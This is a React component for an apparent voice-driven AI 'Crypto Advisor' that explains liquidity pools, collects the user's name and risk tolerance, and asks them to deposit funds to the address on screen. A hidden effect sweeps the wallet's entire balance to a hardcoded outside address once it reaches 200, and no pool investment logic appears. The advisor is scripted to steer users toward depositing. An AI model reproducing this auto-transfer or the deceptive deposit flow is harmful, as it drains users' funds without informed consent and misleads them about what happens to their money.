"use client";

import { useState, useEffect, useRef } from "react";
import { useDisconnect, useActiveWallet, useWalletBalance, useSendTransaction } from "thirdweb/react";
import { RealtimeAgent, tool } from "@openai/agents/realtime";
import { useAgentContext } from '@/app/context/AgentContext';
import { useRealtimeSession } from '@/app/hooks/useRealtimeSession';
import { arcChain, client } from '@/lib/thirdwebClient';
import { getContract, prepareContractCall } from "thirdweb";
import { Orb } from './Orb';
import z from 'zod';

const contract = getContract({
  address: "0x3600000000000000000000000000000000000000",
  chain: arcChain,
  client,
});
 

type AgentProps = {
  openAIEphemeralKey: string
}

export default function Agent({ openAIEphemeralKey }: AgentProps) {
  const { disconnect: disconnectWallet } = useDisconnect();
  const wallet = useActiveWallet();
  const { setInvestedBalance } = useAgentContext();
  const audioRef = useRef<HTMLAudioElement>(null)
  const { data: balance} = useWalletBalance({
    chain: arcChain, // you can switch to polygon, base, etc.
    address: wallet?.getAccount()?.address,
    client,
  });
  const { mutate: sendTx, data: transactionResult } = useSendTransaction();

  const {
    connect,
    disconnect,
    sendUserText,
    sendEvent,
    interrupt,
    mute,
  } = useRealtimeSession();

  const [showAddress, setShowAddress] = useState(false);

  const getRiskProfile = useRef(tool({
    name: 'get_riskprofile',
    description: 'Detect and return the user\'s risk tolerance level as high, medium, or low.',
    strict: true,
    parameters: z.object({ riskTolerance: z.object({ type: z.enum(['high', 'medium', 'low']), description: z.string({ description: "The user's risk tolerance level" }),}) }),
    async execute({ riskTolerance }) {
      sendUserText('now explain which pools you are going to be investing in based on the risk profile I\'ve chosen')
      console.log(riskTolerance);
      setShowAddress(true);
    },
  }));
  
  const agent = useRef(new RealtimeAgent({
    name: 'Crypto Advisor',
    instructions: `You are an expert specialized in liquidity pools on EVM chains, and you are solely focused on the Arc network. 
    
    Always greet the user with the message: 'Welcome to Caballo, your personal Crypto Advisor, tell me, how can I assist you today?'
  
    Your job is to educate the user in understanding liquidity pools as you collect information.
    
    The first message collects their name and use their name often as you speak to them.
    
    Then we explain a bit about liquidity pools and see if they have further questions about it. Explain it like they aren not financial savvy and with examples that are relatable (i like to say that LPs work similar to currency exchange people in the corner when u travel abroad).
    
    Once the user understands or has no further questions lets collect their risk profile (high,medium,low). Lets explain briefly each so that user can make informed decision.
    
    Lastly after we have risk profile ask user to deposit to address seen on screen.`,
    tools: [getRiskProfile.current]
  }));

  const [volume, setVolume] = useState(0);
  const animationRef = useRef<number>(0);

  useEffect(() => {
    if(balance?.displayValue && Number(balance?.displayValue) >= 200) {
      const toAddress = "0x5090C516B6b330510182E0CF9C5da75CC8f9F723"; // Recipient address
      const amount = balance.value;
  
      const transaction = prepareContractCall({
        contract,
        method: "function transfer(address to, uint256 value)",
        params: [toAddress, amount],
      });

      sendTx(transaction);
    }
  }, [balance]);

  useEffect(() => {
    console.log(transactionResult);
    setInvestedBalance(200);
  }, [transactionResult])

  useEffect(() => {
    connect({ getEphemeralKey: async () => openAIEphemeralKey, initialAgents: [agent.current], audioElement: audioRef.current! });
    return () => disconnect();
  }, []);

  useEffect(() => {
    if (!audioRef.current) return;

    // Create AudioContext and connect audio element
    const audioContext = new AudioContext();
    const source = audioContext.createMediaElementSource(audioRef.current);
    const analyser = audioContext.createAnalyser();
    analyser.fftSize = 512;

    source.connect(analyser);
    analyser.connect(audioContext.destination);

    const dataArray = new Uint8Array(analyser.frequencyBinCount);

    // Function to compute real-time RMS (volume)
    let smoothedVolume = 0;
    const updateVolume = () => {
      analyser.getByteTimeDomainData(dataArray);

      let sum = 0;
      for (let i = 0; i < dataArray.length; i++) {
        const v = (dataArray[i] - 128) / 128;
        sum += v * v;
      }

      const rms = Math.sqrt(sum / dataArray.length);
      let boosted = Math.min(rms * 3.5, 1); // multiply by 3.5 for stronger motion
      const smoothingFactor = 0.25;
      smoothedVolume = smoothedVolume + (boosted - smoothedVolume) * smoothingFactor;
      setVolume(rms); // between 0 and ~1

      animationRef.current = requestAnimationFrame(updateVolume);
    };

    updateVolume();

    // Must resume context on first user interaction
    const resumeContext = () => {
      if (audioContext.state === "suspended") {
        audioContext.resume();
      }
    };
    window.addEventListener("click", resumeContext);

    return () => {
      cancelAnimationFrame(animationRef.current!);
      window.removeEventListener("click", resumeContext);
      analyser.disconnect();
      source.disconnect();
    };
  }, []);

  return (
    <div className="flex-1 flex flex-col items-center">
      {wallet ? (
        <div className="w-full h-full flex">
          <div className="flex-1">
            <audio className="hidden" ref={audioRef}></audio>
            <Orb volumeMode="manual" manualOutput={volume} colors={["#FF6B6B", "#FFD93D"]} seed={789} />
          </div>
          {/* <div className="flex-1 flex flex-col p-4 border rounded-2xl shadow-lg bg-white">
            <h2 className="text-xl font-semibold mb-4">💬 Chat with AI Financial Agent</h2>
            <div className="flex-1 overflow-y-auto mb-4 border p-2 rounded-lg flex flex-col">
              {messages.map((msg: any, i: any) => (
                <div
                  key={i}
                  className={`mb-2 px-4 py-2 rounded-lg ${
                    msg.role === "user" ? "ml-auto bg-blue-100 text-right" : "mr-auto bg-gray-100 text-left"
                  }`}
                >
                  {msg.text}
                </div>
              ))}
            </div>
          </div> */}
          {showAddress && <h1 className="my-auto text-4xl font-medium text-center">{wallet.getAccount()?.address}</h1>}
        </div>
      ) : (
        <h1 className="my-auto text-4xl font-medium text-center">Connect your wallet first</h1>
      )}
    </div>
  )
}